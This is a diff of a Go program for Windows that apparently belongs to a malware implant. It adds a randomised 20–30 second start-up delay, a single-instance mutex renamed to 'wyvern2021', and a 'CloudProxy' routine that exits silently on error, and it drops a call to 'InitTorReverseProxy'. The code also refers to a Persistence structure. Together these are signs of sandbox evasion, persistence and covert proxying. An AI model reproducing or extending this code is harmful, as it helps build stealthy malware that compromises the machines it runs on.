@@ -16,9 +16,23 @@ func main() {
 	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
 	rand.Seed(seed.Int64())
 	time.Sleep(time.Second * time.Duration(rand.Intn(10)+20))
-	if _, err := CreateMutex("iIIusi0n"); err != nil {
+	if _, err := CreateMutex("wyvern2021"); err != nil {
 		return
 	}
+
+	errorChan := make(chan error)
+	readyChan := make(chan bool)
+	go CloudProxy(readyChan, errorChan)
+	go func(errChan <-chan error) {
+		for {
+			err := <- errChan
+			if err != nil {
+				os.Exit(0)
+			}
+		}
+	}(errorChan)
+	<- readyChan
+	time.Sleep(time.Second * 3)
 
 	var config Config
 	var persistence Persistence
@@ -46,10 +60,14 @@ func main() {
 func CreateMutex(name string) (uintptr, error) {
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
 	procCreateMutex := kernel32.NewProc("CreateMutexW")
+	ptrName, err := syscall.UTF16PtrFromString(name)
+	if err != nil {
+		return 0, err
+	}
 	ret, _, err := procCreateMutex.Call(
 		0,
 		0,
-		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(name))),
+		uintptr(unsafe.Pointer(ptrName)),
 	)
 	switch int(err.(syscall.Errno)) {
 	case 0:
@@ -60,7 +78,6 @@ func CreateMutex(name string) (uintptr, error) {
 }
 
 func mainFunc(config Config) error {
-	InitTorReverseProxy(config)
 	var handler Handler
 	err := handler.Init(config)
 	return err
